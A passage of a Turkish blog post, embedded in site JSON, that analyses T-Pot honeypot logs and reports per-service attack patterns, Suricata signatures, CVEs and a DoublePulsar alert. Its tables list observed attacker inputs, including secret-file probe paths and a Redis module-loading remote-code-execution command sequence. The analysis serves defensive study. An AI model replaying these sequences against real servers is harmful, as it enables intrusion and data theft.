attacker\\" vard\u0131r. Daha \xf6nceden tehdit istihbarat servisleri taraf\u0131ndan zaten \\"bilinen sald\u0131rgan\\" olarak fi\u015flenmi\u015f IP adresleridir.\\r\\n\\r\\n## 4. Detayl\u0131 Sald\u0131r\u0131 \u0130ncelemeleri (Mikro Analiz)\\r\\n\\r\\nBu b\xf6l\xfcmde Security > Dashboards sekmesi alt\u0131ndan her senaryo i\xe7in olu\u015fturulmu\u015f makinelerin sayfalar\u0131na giderek inceleyece\u011fiz.\\r\\n\\r\\n### Senaryo 1 - Sentrypeer \\r\\n![](media/image-30.png)\\r\\n\\r\\nSentrypeer, \xf6zellikle SIP (Session Initiation Protocol) protokol\xfcn\xfc hedef alan sald\u0131r\u0131lar\u0131 yakalamak i\xe7in tasarlanm\u0131\u015f bir VoIP (Voice over IP) honeypot\'udur. Panodaki (Dashboard) veriler, VoIP sistemlerinin internet \xfczerinden s\xfcrekli ve otomatik sald\u0131r\u0131lara maruz kald\u0131\u011f\u0131n\u0131 a\xe7\u0131k\xe7a g\xf6stermektedir. Sald\u0131r\u0131lar\u0131n temel amac\u0131, sistemlerdeki zay\u0131f kimlik bilgilerini (dahili numara ve parola) tespit ederek bu sistemleri ele ge\xe7irmektir.\\r\\n\\r\\nSald\u0131r\u0131lar\u0131n b\xfcy\xfck bir \xe7o\u011funlu\u011fu REGISTER metodu kullan\u0131larak yap\u0131l\u0131yor. Bu brute force (kaba kuvvet) sald\u0131r\u0131s\u0131, telefon santrali \xfczerinde ge\xe7erli bir dahili numara ve parola kombinasyonu bularak kendilerini sisteme kaydettirmeye \xe7al\u0131\u015ft\u0131klar\u0131n\u0131 g\xf6sterir. \\r\\n\\r\\n\u0130kinci en yayg\u0131n metot olan OPTIONS, genellikle ke\u015fif amac\u0131yla kullan\u0131l\u0131r. Sald\u0131rganlar bu metotla, hedef IP adresinde \xe7al\u0131\u015fan bir SIP sunucusu olup olmad\u0131\u011f\u0131n\u0131 ve hangi \xf6zellikleri destekledi\u011fini anlamaya \xe7al\u0131\u015f\u0131r.\\r\\n\\r\\n> Unique SrcIPs: 9,800\\r\\n\\r\\n> ![](media/image-31.png)\\r\\n\\r\\n\\r\\n\\r\\n### Senaryo 2 - Cowrie\\r\\n\\r\\nCowrie honeypot\'u, SSH ve Telnet protokolleri \xfczerinden gelen kaba kuvvet (brute-force) sald\u0131r\u0131lar\u0131n\u0131 ve s\u0131zma sonras\u0131 aktiviteleri yakalamaktad\u0131r. Bu sald\u0131r\u0131n\u0131n neredeyse tamamen otomatikle\u015ftirilmi\u015f oldu\u011fu anla\u015f\u0131l\u0131yor. Gelen sald\u0131r\u0131lar\u0131n b\xfcy\xfck \xe7o\u011funlu\u011fu, sunuculara ve IoT cihazlar\u0131na uzaktan eri\u015fim i\xe7in kullan\u0131lan SSH portunu hedef almaktad\u0131r. Sald\u0131r\u0131lar\u0131n b\xfcy\xfck bir k\u0131sm\u0131 daha \xf6nce de bahsetti\u011fimiz gibi bilinen sald\u0131rganlara ait IP\'lerden gelmi\u015ftir. \\r\\n\\r\\nS\u0131zma sonras\u0131nda ke\u015fif ama\xe7l\u0131 `uname -a` gibi ke\u015fif komutlar\u0131 kullanm\u0131\u015flard\u0131r. Ama\xe7 sistemin mimarisini \xf6\u011frenmektir. \u0130ndirilen dosyalardan da g\xf6r\xfcld\xfc\u011f\xfc gibi sistem mimarisine g\xf6re haz\u0131rlanm\u0131\u015f `retail` isimli dosyalar mevcut.\\r\\n\\r\\nEn \xe7ok denenen komutlar\\r\\n![](media/image-33.png)\\r\\n![](media/image-34.png)\\r\\n\\r\\n> Unique SrcIPs: 2,650\\r\\n\\r\\n> Unique HASSHs: 50\\r\\n\\r\\n### Senaryo 3 - Dionaea\\r\\n\\r\\nBurada 32526 portunu es ge\xe7iyoruz \xe7\xfcnk\xfc sadece yerel IP olan 10.1.0.4 adresinden geliyor, di\u011fer makinelerde de mevcut. Dionaea g\xf6r\xfcld\xfc\u011f\xfc \xfczere \\"SMBD\\" ba\u015fta olmak \xfczere MSSQL, MongoDB, MySQL gibi veritabanlar\u0131n\u0131 taklit ediyor. SMB protokol\xfcn\xfc (Port 445) hedeflenmi\u015ftir. Windows a\u011flar\u0131nda dosya payla\u015f\u0131m\u0131 i\xe7in kullan\u0131lan bir protokold\xfcr. Zay\u0131f user:pass kombolar\u0131 denenmi\u015ftir. SMB\'nin g\xf6lgesinde kalsa da, sald\u0131rganlar HTTP (Port 80), MSSQL (Microsoft SQL Server) (Port 1433), MySQL (Port 3306) ve MongoDB (Port 27017) gibi di\u011fer servisleri de aktif olarak taramaktad\u0131r. Bu da bizlere sald\u0131rganlar\u0131n a\xe7\u0131kta ne varsa bulmaya \xe7al\u0131\u015ft\u0131\u011f\u0131n\u0131 g\xf6steriyor.\\r\\n\\r\\n![](media/image-35.png)\\r\\n![](media/image-37.png)\\r\\n![](media/image-38.png)\\r\\n\\r\\n### Senaryo 4 - Tanner\\r\\n\\r\\nTanner, bir web sunucusunu taklit ederek HTTP (Port 80) tabanl\u0131 sald\u0131r\u0131lar\u0131, zafiyet taramalar\u0131n\u0131 ve ke\u015fif giri\u015fimlerini yakalayan bir honeypot\'tur. Analiz, internete a\xe7\u0131k olan herhangi bir web sunucusunun, bilinen zafiyetleri ve yayg\u0131n yap\u0131land\u0131rma hatalar\u0131n\u0131 arayan otomatik ara\xe7lar taraf\u0131ndan s\xfcrekli olarak tarand\u0131\u011f\u0131n\u0131 g\xf6stermektedir. Her ne kadar bu raporu haz\u0131rlarken sonlara do\u011fru grafikte yer alsam da oray\u0131 g\xf6rmezden gelebiliriz.\\r\\n\\r\\n* Sald\u0131rganlar, veritaban\u0131 parolalar\u0131 ve API anahtarlar\u0131 gibi kritik bilgileri i\xe7eren /.env, /config.php ve /.git/config gibi dosyalar\u0131 ele ge\xe7irmeye \xe7al\u0131\u015fmaktad\u0131r.\\r\\n* /vendor/phpunit/src/Util/PHP/eval-stdin.php yoluna yap\u0131lan istekler, PHPUnit (CVE-2017-9841)\'deki bilinen ve uzaktan kod \xe7al\u0131\u015ft\u0131rmaya (Remote Code Execution) olanak tan\u0131yan kritik bir zafiyeti s\xf6m\xfcrme giri\u015fimleridir.\\r\\n* /swagger (API aray\xfczleri), /containers/json (Docker API) gibi yollar\u0131n taranmas\u0131, sald\u0131rganlar\u0131n korunmas\u0131z b\u0131rak\u0131lm\u0131\u015f servisleri arad\u0131\u011f\u0131n\u0131 g\xf6stermektedir.\\r\\n\\r\\n\\r\\n| Tanner URI                                             | Say\u0131s\u0131 |\\r\\n| ------------------------------------------------------ | ----- |\\r\\n| /                                                      | 525   |\\r\\n| /admin/config.php                                      | 91    |\\r\\n| /favicon.ico                                           | 75    |\\r\\n| /.env                                                  | 74    |\\r\\n| /config.php                                            | 33    |\\r\\n| /robots.txt                                            | 23    |\\r\\n| /.git/config                                           | 20    |\\r\\n| /backend/.env                                          | 17    |\\r\\n| /api/swagger                                           | 15    |\\r\\n| /swagger                                               | 15    |\\r\\n| /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php    | 15    |\\r\\n| /boaform/admin/formLogin                               | 14    |\\r\\n| /containers/json                                       | 14    |\\r\\n| /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php | 12    |\\r\\n| /admin/config.php?password%5B0%5D=ZIZO\\\\&username=admin | 12    |\\r\\n\\r\\n| Tanner HTTP User Agent                           | Count |\\r\\n| --------------------------------------------------------------------------- | ----- |\\r\\n| Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36                                                                                                          | 2,959 |\\r\\n| libredtail-http                                                                                                                                                                                                              | 440   |\\r\\n| Mozilla/5.0 (iPhone; CPU iPhone OS 13\\\\_2\\\\_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1                                                                                | 311   |\\r\\n| Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; yie11; rv:11.0) like Gecko                                                                                                                                                 | 276   |\\r\\n| Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)                                                               | 276   |\\r\\n| curl/7.81.0                                                                                                                                                                                                                  | 181   |\\r\\n| Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36                                                                                                         | 104   |\\r\\n| Mozilla/5.0 (compatible; CensysInspect/1.1; +`https://about.censys.io`)     | 89    |\\r\\n| Custom-AsyncHttpClient                                                                                                                                                                                                       | 88    |\\r\\n| Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE                                                                                                     | 67    |\\r\\n| mrtscan/1.0 (westus)                                                                                                                                                                                                         | 48    |\\r\\n| Hello from Palo Alto Networks, find out more about our scans in `https://docs-cortex.paloaltonetworks.com/r/1/Cortex-Xpanse/Scanning-activity` | 36    |\\r\\n\\r\\n![](media/image-39.png)\\r\\n\\r\\n\\r\\n> Unique SrcIPs: 9,800\\r\\n\\r\\n\\r\\n\\r\\n### Senaryo 5 - Redishoneypot\\r\\n\\r\\nRedis Honeypot\'u, internete a\xe7\u0131k ve genellikle parola korumas\u0131 olmayan Redis (in-memory key-value) veritabanlar\u0131n\u0131 hedef alan sald\u0131r\u0131lar\u0131 yakalamaktad\u0131r. 6379 numaral\u0131 port varsay\u0131lan port numaras\u0131d\u0131r. G\xf6zlemlenen komutlar, as\u0131l amac\u0131n veri \xe7almaktan daha \xe7ok sunucuda uzaktan kod \xe7al\u0131\u015ft\u0131rmak (Remote Code Execution - RCE) oldu\u011funu anlat\u0131yor. `info server` ile bilgi toplama ve `FLUSHDB` ile veritaban\u0131n\u0131 temizleme, \xe7al\u0131\u015ft\u0131r\u0131labilir bir k\xfct\xfcphane dosyas\u0131 gibi `exp.so` olarak dosya kaydetme ve \xe7al\u0131\u015ft\u0131rma denemeleri, ard\u0131ndan temizleme i\u015flemleri g\xf6zlemleniyor. \\r\\n\\r\\n| Action                           | Say\u0131 |\\r\\n| -------------------------------- | ----- |\\r\\n| NewConnect                       | 368   |\\r\\n| Closed                           | 360   |\\r\\n| config set dbfilename dump.rdb   | 280   |\\r\\n| config set dir .                 | 280   |\\r\\n| FLUSHDB                          | 189   |\\r\\n| SLAVEOF NO ONE                   | 187   |\\r\\n| config set rdbcompression no     | 187   |\\r\\n| config set rdbcompression yes    | 187   |\\r\\n| save                             | 187   |\\r\\n| MODULE LOAD /tmp/exp.so          | 101   |\\r\\n| info server                      | 94    |\\r\\n| system.exec \\"rm -rf /tmp/exp.so\\" | 94    |\\r\\n| CONFIG SET dbfilename exp.so     | 93    |\\r\\n| CONFIG SET dir /tmp/             | 93    |\\r\\n| MODULE UNLOAD system             | 93    |\\r\\n\\r\\n\\r\\n### Senaryo 6 - ConPot\\r\\n\\r\\nConpot, \xf6zellikle end\xfcstriyel kontrol sistemleri (ICS / SCADA) i\xe7in geli\u015ftirilmi\u015f bir honeypot\u2019tur. Amac\u0131 sald\u0131rganlar\u0131n SCADA / end\xfcstriyel protokollere (\xf6r. Modbus, Siemens S7, BACnet, SNMP) y\xf6nelik sald\u0131r\u0131lar\u0131n\u0131 yakalamakt\u0131r. Ger\xe7ek bir PLC (Programmable Logic Controller) ya da end\xfcstriyel bir cihaz\u0131 taklit eder.\\r\\n\\r\\n![](media/image-36.png)\\r\\n\\r\\nSald\u0131rganlar\u0131n denedi\u011fi baz\u0131 girdiler\\r\\n![](media/image-40.png)\\r\\n\\r\\n### Di\u011fer Senaryolar\\r\\n\\r\\n* CiscoASA: Cisco\'nun yayg\u0131n olarak kullan\u0131lan ASA serisi g\xfcvenlik duvarlar\u0131n\u0131 ve VPN servislerini taklit ederek bu cihazlardaki zafiyetleri s\xf6m\xfcrmeye \xe7al\u0131\u015fan sald\u0131rganlar\u0131 yakalar.\\r\\n* H0neytr4p (Port 443): HTTPS portu (443) \xfczerinde \xe7al\u0131\u015farak web sunucular\u0131na y\xf6nelik yap\u0131lan GET ve POST gibi genel tarama ve s\u0131zma giri\u015fimlerini yakalayan bir honeypot\'tur.\\r\\n* Adbhoney (Port 5555): \u0130nternete a\xe7\u0131k b\u0131rak\u0131lm\u0131\u015f Android cihazlar\u0131 (telefon, TV vb.) arayan ve Android Debug Bridge (ADB) servisini s\xf6m\xfcrmeye \xe7al\u0131\u015fan zararl\u0131 yaz\u0131l\u0131mlar\u0131 yakalamak i\xe7in tasarlanm\u0131\u015ft\u0131r. rm -f /data/local/tmp/*.apk gibi baz\u0131 komut denemeleri kayda ge\xe7mi\u015f.\\r\\n* Mailoney (Port 25): \u0130nternet \xfczerinde spam e-posta g\xf6ndermek i\xe7in kullanabilecekleri, yanl\u0131\u015f yap\u0131land\u0131r\u0131lm\u0131\u015f bir e-posta sunucusunu (SMTP) taklit ederek spammer\'lar\u0131 ve botnet\'leri yakalar.\\r\\n\\r\\n## 5. Suricata \u0130mzalar\u0131 ve CVE \\r\\n\\r\\n### Suricata Nedir? \\r\\n\\r\\nSuricata, a\xe7\u0131k kaynak tabanl\u0131 bir sald\u0131r\u0131 tespit sistemi ve sald\u0131r\u0131 \xf6nleme sistemidir (IDS/IPS).\\r\\nT-Pot i\xe7erisinde bir **a\u011f kameras\u0131** gibi davran\u0131r. A\u011f aray\xfcz\xfcnden gelen t\xfcm trafi\u011fi, herhangi bir honeypot servisine (Cowrie, Dionaea vb.) ula\u015fmadan \xf6nce inceler. Yani, sistemin ana giri\u015f kap\u0131s\u0131ndaki bir g\xfcvenlik kameras\u0131 gibi davran\u0131r. **Suricata, bu trafi\u011fi kendi imza (kural) setleriyle kar\u015f\u0131la\u015ft\u0131r\u0131r.** E\u011fer \u015f\xfcpheli bir desen veya bilinen bir sald\u0131r\u0131 vekt\xf6r\xfc tespit ederse, an\u0131nda bir alarm olu\u015fturur ve bu alarm\u0131 log dosyas\u0131na (eve.json) yazar. T-Pot, Suricata\'n\u0131n \xfcretti\u011fi bu loglar\u0131 otomatik olarak okur ve analiz i\xe7in Elasticsearch\'e g\xf6nderir. Ve en son Kibana arac\u0131l\u0131\u011f\u0131yla `Suricata CVE` ve `Suricata Alert Signature` gibi panellerle do\u011frudan T-Pot\'taki Suricata servisinin yakalad\u0131\u011f\u0131 ve Elasticsearch\'e g\xf6nderdi\u011fi ger\xe7ek verileri g\xf6rselle\u015ftirir.\\r\\n\\r\\n[Suricata Web Sitesi](https://suricata.io/)\\r\\n\\r\\nBir sald\u0131rgan\u0131n \xf6nce sistemimizde bir port taramas\u0131 yapt\u0131\u011f\u0131n\u0131 ve ard\u0131ndan SSH portuna y\xf6neldi\u011fini d\xfc\u015f\xfcnelim. Port taramas\u0131n\u0131 Suricata tespit eder, SSH denemesini ise Cowrie Honeypot\'u. Kibana \xfczerinde bu iki farkl\u0131 kaynaktan gelen loglar\u0131 birle\u015ftirdi\u011finizde, sald\u0131rgan\u0131n t\xfcm ad\u0131mlar\u0131n\u0131 (ke\u015fif ve ard\u0131ndan sald\u0131r\u0131) g\xf6rebiliriz.\\r\\n\\r\\nEn \xe7ok kaydedilen Suricata \u0130mzalar\u0131\\r\\n\\r\\n| ID  | A\xe7\u0131klama   | Say\u0131 |\\r\\n| ---------- | ------- | ------- | \\r\\n| 2210045 |\\tSURICATA STREAM Packet with invalid ack |\\t41,676\\r\\n| 2210029\\t| SURICATA STREAM ESTABLISHED invalid ack |\\t41,636\\r\\n| 2210065\\t| SURICATA STREAM ESTABLISHED ack for ZWP data |\\t41,636\\r\\n| 2024766\\t| ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication |\\t32,517\\r\\n| 2006408\\t| ET INFO HTTP Request on Unusual Port Possibly Hostile |\\t22,924\\r\\n| 2210020\\t| SURICATA STREAM ESTABLISHED packet out of window |\\t20,684\\r\\n| 2001978\\t| ET INFO SSH session in progress on Expected Port |\\t7,763\\r\\n| 2210037\\t| SURICATA STREAM FIN recv but no session |\\t4,552\\r\\n| 2210051\\t| SURICATA STREAM Packet with broken ack |\\t3,914\\r\\n| 2038967\\t| ET INFO SSH-2.0-Go version string Observed in Network Traffic |\\t3,417\\r\\n| 2210061\\t| SURICATA STREAM spurious retransmission |\\t2,971\\r\\n| 2402000\\t| ET DROP Dshield Block Listed Source group 1 |\\t2,652\\r\\n| 2002752\\t| ET INFO Reserved Internal IP Traffic |\\t1,907\\r\\n| 2210041\\t| SURICATA STREAM RST recv but no session |\\t1,667\\r\\n| 2009582\\t| ET SCAN NMAP -sS window 1024 |\\t1,640\\r\\n\\r\\nEn \xe7ok kaydedilen CVE\'ler (Common Vulnerabilities and Exposures)\\r\\n\\r\\n| CVE ID  | Say\u0131 |\\r\\n| ---------- | ------- |\\r\\n| CVE-2002-0013 CVE-2002-0012 |\\t902\\r\\n| CVE-2002-0013 CVE-2002-0012 CVE-1999-0517 |\\t340\\r\\n| CVE-2019-11500 |\\t130\\r\\n| CVE-2021-3449 |\\t95\\r\\n| CVE-2002-1149 |\\t89\\r\\n| CVE-2006-2369 |\\t58\\r\\n| CVE-2024-4577 CVE-2002-0953 |\\t22\\r\\n| CVE-2024-4577 |\\t22\\r\\n| CVE-2016-20016  |\\t16\\r\\n| CVE-2006-3602 CVE-2006-4458 CVE-2006-4542 |\\t15\\r\\n| CVE-2021-41773 |\\t12\\r\\n| CVE-2021-42013 |\\t12\\r\\n| CVE-2003-0825 |\\t8\\r\\n| CVE-2022-27255  |\\t7\\r\\n| CVE-2009-2765 |\\t3\\r\\n| CVE-2024-3721 |\\t3\\r\\n| CVE-2024-44000  |\\t3\\r\\n\\r\\nListede sonlara do\u011fru yer alsa da g\xfcncel say\u0131labilecek bir \xe7ok CVE mevcut.\\r\\n\\r\\n* CVE-2025-30208: Vite\'da (web geli\u015ftirme arac\u0131) bulunan ve sunucudaki hassas dosyalar\u0131n okunmas\u0131na olanak tan\u0131yan bir dosya okuma zafiyetidir.\\r\\n\\r\\n* CVE-2023-47565: QNAP VioStor NVR (video kay\u0131t cihaz\u0131) \xfcr\xfcnlerinde bulunan ve cihaz\u0131n tam kontrol\xfcn\xfcn ele ge\xe7irilmesine yol a\xe7an bir komut enjeksiyonu zafiyetidir.\\r\\n\\r\\n* CVE-2019-9670: Zimbra Collaboration Suite\'te (e-posta platformu) bulunan ve dosya okuma veya uzaktan kod \xe7al\u0131\u015ft\u0131rmaya (RCE) olanak tan\u0131yan bir XXE zafiyetidir.\\r\\n\\r\\n* CVE-2022-0543: Debian tabanl\u0131 sistemlerdeki Redis\'te bulunan ve uzaktan kod \xe7al\u0131\u015ft\u0131rmaya (RCE) izin veren bir Lua sanal alan\u0131ndan (sandbox) ka\xe7\u0131\u015f zafiyetidir.\\r\\n\\r\\n* CVE-2024-44000: WordPress LiteSpeed Cache eklentisinde bulunan ve hata ay\u0131klama modu a\xe7\u0131kken hassas kullan\u0131c\u0131 bilgilerini s\u0131zd\u0131rarak hesaplar\u0131n ele ge\xe7irilmesine yol a\xe7an bir zafiyettir.\\r\\n\\r\\n* CVE-2024-23692: Rejetto HFS (HTTP File Server) yaz\u0131l\u0131m\u0131nda bulunan ve kimlik do\u011frulamas\u0131 olmadan uzaktan kod \xe7al\u0131\u015ft\u0131rmaya (RCE) olanak tan\u0131yan bir \u015fablon enjeksiyonu zafiyetidir.\\r\\n\\r\\n* CVE-2024-3721: TBK marka DVR (video kay\u0131t cihaz\u0131) cihazlar\u0131nda bulunan ve cihazlar\u0131n botnet\'e d\xf6n\xfc\u015ft\xfcr\xfclmesine neden olan bir komut enjeksiyonu zafiyetidir.\\r\\n\\r\\n\\r\\n### \xd6rnek Suricata \u0130mza \u0130ncelemesi\\r\\n\\r\\n![](media/image-12.png)\\r\\n\\r\\nElasticsearch Men\xfc > Analytics > Discover sekmesine geldikten sonra KQL ile filtreleme yapal\u0131m. \u0130lgili Index Pattern\'in `logstash-*` oldu\u011fundan emin olal\u0131m (Mant\u0131ken, olu\u015fan Veri Setimiz de diyebiliriz). Sorgu k\u0131sm\u0131na `alert.signature.keyword : ET EXPLOIT *` yazd\u0131ktan sonra sonu\xe7lara bakal\u0131m.\\r\\n\\r\\n![](media/image-15.png)\\r\\n![](media/image-13.png)\\r\\n\\r\\n Bir log\'u geni\u015fletelim ve incelemeye ba\u015flayal\u0131m. Copy Value diyerek daha okunabilir bir metin edit\xf6r\xfcnde g\xf6r\xfcnt\xfcleyeblirsiniz.\\r\\n\\r\\n ![](media/image-14.png)\\r\\n\\r\\n \u0130nceleme sonucunda baz\u0131 \xf6nemli verileri elde ettik. \\r\\n \\r\\n > (A\u015fa\u011f\u0131daki k\u0131s\u0131mda ilgili de\u011ferlerin sadece bir k\u0131sm\u0131n\u0131 ald\u0131m. IP, GeoIP, ASN, b\xf6lge isimleri vb. bilgiler de ilgili veriler i\xe7erisinde mevcut.)\\r\\n\\r\\n ```\\r\\n ...\\r\\n  \\"alert.metadata.attack_target\\": [\\r\\n        \\"SMB_Server\\"\\r\\n      ],\\r\\n  \\"alert.metadata.affected_product\\": [\\r\\n      \\"Windows_XP_Vista_7_8_10_Server_32_64_Bit\\"\\r\\n    ],\\r\\n  \\"alert.metadata.attack_target.keyword\\": [\\r\\n      \\"SMB_Server\\"\\r\\n    ],\\r\\n  \\"timestamp\\": [\\r\\n    \\"2025-08-13T09:55:30.963Z\\"\\r\\n  ],\\r\\n  \\"payload_printable\\": [\\r\\n      \\"Rs6^Rs6^Rs6^Rs6^Rs6^Rs6...\\r\\n  ],\\r\\n  \\"payload\\": [\\r\\n      \\"UnM2XlJzNl5S...\\r\\n  ],\\r\\n  \\"dest_port\\": [\\r\\n      445\\r\\n    ],\\r\\n  \\"app_proto.keyword\\": [\\r\\n      \\"smb\\"\\r\\n    ],\\r\\n  \\"alert.signature.keyword\\": [\\r\\n      \\"ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication\\"\\r\\n    ],\\r\\n  \\"alert.category.keyword\\": [\\r\\n      \\"Attempted Administrator Privilege Gain\\"\\r\\n    ],\\r\\n  \\"proto\\": [\\r\\n      \\"TCP\\"\\r\\n    ],\\r\\n  \\"highlight\\": {\\r\\n    \\"alert.signature.keyword\\": [\\r\\n      \\"@kibana-highlighted-field@ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication@/kibana-highlighted-field@\\"\\r\\n    ]\\r\\n  },\\r\\n  \\"sort\\": [\\r\\n    \\"2025-08-13T09:55:30.963Z\\",\\r\\n    236045\\r\\n  ]\\r\\n...\\r\\n\\r\\n```\\r\\n\\r\\n**Tarih ve Saat:** 13 A\u011fustos 2025, 09:55:30 (UTC)\\r\\n\\r\\n**Tespit Edilen Tehdit:** A\u011f trafi\u011fi \xfczerinde yap\u0131lan incelemede, \\"ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication\\" imzas\u0131yla e\u015fle\u015fen bir sald\u0131r\u0131 giri\u015fimi tespit edilmi\u015ftir. Bu alarm, MS17-010 (EternalBlue) zafiyetinin ba\u015far\u0131l\u0131 bir \u015fekilde s\xf6m\xfcr\xfclmesinin ard\u0131ndan sisteme tam eri\u015fim sa\u011flamak amac\u0131yla kullan\u0131lan DoublePulsar adl\u0131 k\xf6t\xfcc\xfcl yaz\u0131l\u0131m\u0131n kurulum ve ileti\u015fim a\u015famas\u0131na i\u015faret etmektedir.\\r\\n\\r\\n**Sald\u0131r\u0131 Detaylar\u0131:**\\r\\n\\r\\n**Hedef Port/Protokol:** Sald\u0131r\u0131, Windows sistemlerinde dosya payla\u015f\u0131m\u0131 i\xe7in kullan\u0131lan 445 numaral\u0131 TCP portu \xfczerinden SMB (Server Message Block) protokol\xfcn\xfc hedef alm\u0131\u015ft\u0131r.\\r\\n\\r\\n**Hedef Sistem:** Metadata\'ya g\xf6re, bu sald\u0131r\u0131 Windows XP\'den Windows 10\'a ve Server s\xfcr\xfcmlerine kadar geni\u015f bir yelpazedeki Microsoft i\u015fletim sistemlerini etkileyen bir zafiyeti hedeflemekte.\\r\\n\\r\\n**Sald\u0131r\u0131n\u0131n Amac\u0131:** Tespit edilen alarm\u0131n kategorisi olan \\"Attempted Administrator Privilege Gain\\" (Y\xf6netici Ayr\u0131cal\u0131klar\u0131 Kazanma Giri\u015fimi / Yetki Y\xfckseltme Giri\u015fmi), sald\u0131rgan\u0131n sistem \xfczerinde en y\xfcksek yetkileri ele ge\xe7irmeyi ama\xe7lad\u0131\u011f\u0131n\u0131 do\u011frulamaktad\u0131r. Bu yetki seviyesi, sald\u0131rgana veri \xe7alma, fidye yaz\u0131l\u0131m\u0131 da\u011f\u0131tma veya sistemi bir botnet\'e dahil etme gibi eylemler i\xe7in tam kontrol imkan\u0131 sunar.\\r\\n\\r\\n**Sonu\xe7:** Bu log kay\u0131tlar\u0131, T-Pot Honeypot sistemimizin modern ve tehlikeli bir tehdit taraf\u0131ndan hedef al\u0131nd\u0131\u011f\u0131n\u0131n somut bir kan\u0131t\u0131d\u0131r. Sald\u0131rganlar\u0131n, WannaCry gibi b\xfcy\xfck siber salg\u0131nlarla \xfcnlenmi\u015f olan EternalBlue/DoublePulsar kombinasyonunu hala aktif olarak kulland\u0131\u011f\u0131 g\xf6r\xfclmektedir.\\r\\n\\r\\n## Sonu\xe7 ve De\u011ferlendirme\\r\\n\\r\\nYakla\u015f\u0131k 8 g\xfcn boyunca a\xe7\u0131k kalan T-Pot Honeypot ortam\u0131 bize ger\xe7ekten \xe7ok \u015fey g\xf6sterdi. Bu kadar k\u0131sa s\xfcrede bu say\u0131da bir sald\u0131r\u0131y\u0131 a\xe7\u0131k\xe7as\u0131 beklemiyordum. Yakla\u015f\u0131k 6,6 milyon log kaydettik. \u0130lk bak\u0131\u015fta sadece basit brute-force denemeleri gelir diye d\xfc\u015f\xfcn\xfclse de, asl\u0131nda farkl\u0131 servisleri hedefleyen olduk\xe7a \xe7e\u015fitli sald\u0131r\u0131larla kar\u015f\u0131la\u015ft\u0131k. Sentrypeer, Cowrie, Dionaea, Tanner, Redishoneypot gibi honeypot senaryolar\u0131 \xfczerinden gelen sald\u0131r\u0131lar, her bir platformun farkl\u0131 protokoller ve servisler \xfczerinden ne kadar yo\u011fun hedef al\u0131nd\u0131\u011f\u0131n\u0131 ortaya koydu.\\r\\n\\r\\nElasticsearch ve Kibana sayesinde toplanan verileri g\xf6rselle\u015ftirip anlaml\u0131 hale getirmek \xe7ok daha kolay oldu. Hangi IP\u2019lerin \xf6ne \xe7\u0131kt\u0131\u011f\u0131n\u0131, hangi URI\u2019lar\u0131n s\u0131k hedeflendi\u011fini ya da sald\u0131rganlar\u0131n hangi User-Agent\u2019leri taklit etti\u011fini tek bak\u0131\u015fta g\xf6rebildik. Suricata imzalar\u0131 ve CVE\'ler ile de sald\u0131r\u0131lar\u0131n yaln\u0131zca say\u0131 olarak de\u011fil, ger\xe7ekten hangi zafiyetlere kar\u015f\u0131 denendi\u011fini g\xf6rm\xfc\u015f olduk. Baz\u0131 denemeler art\u0131k ge\xe7erlili\u011fini yitirmi\u015f olsa da halen zaafiyetlere sebep olabiliyor. Parolam\u0131z\u0131n g\xfc\xe7l\xfc olmas\u0131, sistemlerimizin her zaman g\xfcncel olmas\u0131, ihtiyac\u0131m\u0131z olmayan servislerin kapal\u0131 olmas\u0131 d\u0131\u015far\u0131dan gelebilecek sald\u0131r\u0131lar\u0131n b\xfcy\xfck oranda engellenmesinde b\xfcy\xfck \xf6nem ta\u015f\u0131yor.\\r\\n\\r\\nK\u0131sacas\u0131, honeypot kurmak sadece sald\u0131r\u0131 trafi\u011fini izlemek de\u011fil, ayn\u0131 zamanda tehdit akt\xf6rlerinin y\xf6ntemlerini anlamak i\xe7in de \xe7ok de\u011ferli bir deneyim sunuyor. T-Pot\u2019un farkl\u0131 honeypot senaryolar\u0131n\u0131 tek bir \xe7at\u0131 alt\u0131nda sunmas\u0131 sayesinde k\u0131sa s\xfcrede olduk\xe7a zengin bir veri elde etmek m\xfcmk\xfcn oldu. Bu projeyi bir \xfcst seviyeye ta\u015f\u0131mak i\xe7in bundan sonraki ad\u0131m ise bu verileri tehdit istihbarat\u0131 s\xfcre\xe7lerine ba\u011flamak, yakalanan tehditlere \xf6zel Firewall, IPS, IDS kurallar\u0131 \xfcretmek ve otomasyonla daha kullan\u0131\u015fl\u0131 hale getirmek olabilir.\\r\\n\\r\\n[Github](https://www.github.com/berkercelik)\\r\\n\\r\\n[Blog](https://berkercelik.github.io/b-log)\\r\\n\\r\\n[Linkedin](https://www.linkedin.com/in/berkaliercelik/)"},{"id":"honeypot-tpot-kurulumu","metadata":{"permalink":"/b-log/blog/honeypot-tpot-kurulumu","editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/blog/2025-08-07/2025-08-07-honeypot-tpot-kurulumu.md","source":"@site/blog/2025-08-07/2025-08-07-honeypot-tpot-kurulumu.md","title":"Honeypot Projesi - T-pot Honeypot Kurulumu - \u0130lk \u0130zlenimler - B\xf6l\xfcm 1","description":"Giri\u015f","date":"2025-08-07T00:00:00.000Z","tags":[{"inline":false,"label":"Siber G\xfcvenlik","permalink":"/b-log/blog/tags/siberguvenlik","description":"G\xfcvenlik a\xe7\u0131klar\u0131, s\u0131zma testleri ve savunma teknikleri"},{"inline":false,"label":"Sistem Y\xf6netimi","permalink":"/b-log/blog/tags/sistemyonetimi","description":"Sistem y\xf6neticili\u011fi, sunucu yap\u0131land\u0131rma ve y\xf6netimi 